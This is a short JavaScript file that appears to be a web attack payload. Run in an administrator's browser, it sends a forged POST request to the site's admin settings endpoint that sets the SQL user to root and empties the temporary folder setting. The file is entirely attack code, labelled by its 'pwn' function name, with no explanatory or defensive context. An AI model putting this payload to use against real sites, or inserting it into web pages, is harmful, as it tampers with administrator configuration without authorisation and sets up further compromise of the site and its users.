var target = document.location.host;

function pwnSettingtmpFolderBaseName() {
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://" + target + "/index.php/admin/settings/globalsave",true);
    xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhttp.send("save=1&fields[sql_user]=root&fields[tmpFolderBaseName]=");
}
